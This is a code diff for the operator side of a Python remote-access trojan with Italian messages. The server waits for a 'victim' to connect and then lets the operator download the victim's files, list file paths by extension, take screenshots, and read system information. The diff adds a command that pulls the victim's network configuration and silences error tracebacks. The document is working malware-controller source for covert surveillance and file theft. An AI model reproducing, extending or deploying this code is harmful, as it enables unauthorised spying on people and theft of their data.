@@ -56,7 +56,7 @@ def serverConnection():
         print(f"[LISTENING] The Sever is waiting for a victim...\n")
         return server
     except:
-        traceback.print_exc()
+        #traceback.print_exc()
         print(f"[ERROR] Accensione server non riuscita...\n")
         return "errore"
 
@@ -66,8 +66,7 @@ def commandsHelp():
         print(
             f"\n#####                                       Comandi disponibili                                                     ####")
         print()
-        print(
-            f"Download di file:                           download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
+        print(f"Download di file:                           download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
         print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>")
         print(f"Mostra Working Directory:                   pwd")
         print(f"Lista dei file in un percorso:              ls")
@@ -77,6 +76,7 @@ def commandsHelp():
         print(f"Effettua screenshot:                        screenshot")
         print(f"Esci dal controllo remoto:                  exit")
         print(f"Ripulisci terminale:                        clear")
+        print(f"Informazioni ifconfig:                      rete/network")
         print(f"Informazioni so client:                     info")
         print()
         print("####################################\n")
@@ -112,7 +112,7 @@ def printInformazioni(clientConnection, addr):
             else:
                 return ""
     except:
-        traceback.print_exc()
+        #traceback.print_exc()
         print(f"[NOT RECEIVING] Informazioni non ricevute\n")
         fileLog = fileLog + "\n" + f"[NOT RECEIVING] Informazioni non ricevute\n" + "\n"
         raise Exception
@@ -146,7 +146,7 @@ def filespath(clientConnection):
             print(f"File con percorsi dei file creato e scritto correttamente!\n")
 
     except:
-        traceback.print_exc()
+        #traceback.print_exc()
         fileLog = fileLog + "\n" + "Filespath non riuscito\n"
         print("Filespath non riuscito\n")
 
@@ -206,7 +206,7 @@ def remoteControl(clientConnection,buff):
                             print(dato)
                             fileLog = fileLog + "\n" + dato + "\n"
                     except:
-                        traceback.print_exc()
+                        #traceback.print_exc()
                         print("\nAn error occurred, try again\n")
                         fileLog = fileLog + "\n" + "An error occurred, try again...\n"
 
@@ -243,7 +243,7 @@ def remoteControl(clientConnection,buff):
                                       bar_format="{desc}: {percentage:3.0f}% {bar}"):
                             sleep(0.2)
                     except:
-                        traceback.print_exc()
+                        #traceback.print_exc()
                         fileLog = fileLog + "\n" + "Find non eseguito correttamente\n"
                         print("Find non eseguito correttamente\n")
                 else:
@@ -303,9 +303,22 @@ def remoteControl(clientConnection,buff):
                     else:
                         raise Exception
                 except:
-                    traceback.print_exc()
+                    #traceback.print_exc()
                     print("Download fallito\n")
                     fileLog = fileLog + "\n" + "Download fallito\n"
+
+            elif comando[0:4] == "rete" or comando[0:7]=="network":
+                try:
+                    dato = clientConnection.recv(10000).decode()
+                    if dato[0:7] == "[ERROR]":
+                        raise Exception
+                    else:
+                        print(dato)
+                        fileLog = fileLog + "\n" + dato +"\n"
+                except:
+                    #traceback.print_exc()
+                    print("\nAn error occurred, try again\n")
+                    fileLog = fileLog + "\n" + "An error occurred, try again...\n"
 
             elif comando == "screenshot":
                 nomeFoto = input("Inserire nome foto: ")
@@ -350,16 +363,15 @@ def remoteControl(clientConnection,buff):
                         raise Exception
 
                 except:
-                    traceback.print_exc()
+                    #traceback.print_exc()
                     print("Screenshot fallito\n")
                     fileLog = fileLog + "\n" + "Screenshot fallito\n"
-                    #os.remove(nomeFoto)
             else:
                print("[COMANDO ERRATO/NON DISPONIBILE] Command not found... \n")
                fileLog = fileLog + "\n" + "[COMANDO ERRATO/NON DISPONIBILE] Command not found... \n"
 
         except Exception as e:
-            traceback.print_exc()
+            #traceback.print_exc()
             if e.__class__.__name__ == "ConnectionResetError":
                 print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
                 fileLog = fileLog + "\n" + "[CONNECTION INTERRUPTED] Connessione interrotta\n" + "\n"
@@ -367,13 +379,12 @@ def remoteControl(clientConnection,buff):
             else:
                 raise e
 
-
 def main():
     try:
         signal.signal(signal.SIGINT, signalHandler)
         server = serverConnection()
         if server == "errore":
-            traceback.print_exc()
+            #traceback.print_exc()
             raise Exception
         else:
             exit = False
@@ -395,7 +406,7 @@ def main():
                 try:
                     buff=printInformazioni(clientConnection,addr)
                 except Exception as e:
-                    traceback.print_exc()
+                    #traceback.print_exc()
                     if e.__class__.__name__ == "ConnectionResetError":
                         print(f"[ERROR] Connessione con client {addr} interrotta!!!\n")
                         fileLog = fileLog + "\n" + f"[ERROR] Connessione con client {addr} interrotta!!!\n"
@@ -416,7 +427,7 @@ def main():
                         attivo = 0
 
                     except Exception as e:
-                        traceback.print_exc()
+                        #traceback.print_exc()
                         if e.__class__.__name__ == "ConnectionResetError":
                             print(f"La connessione con il client {addr} si è interrotta\n")
                             fileLog = fileLog + "\n" + f"La connessione con il client {addr} si è interrotta\n" + "\n"
@@ -480,7 +491,7 @@ def main():
                     server.close()
 
     except Exception as e:
-        traceback.print_exc()
+        #traceback.print_exc()
         if e.__class__.__name__ == "ConnectionResetError":
             print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
             raise e
@@ -490,7 +501,7 @@ if __name__ == "__main__":
     try:
         main()
     except:
-        traceback.print_exc()
+        #traceback.print_exc()
         file = open("fileLog.txt", "w")
         file.write(fileLog)
         file.close()
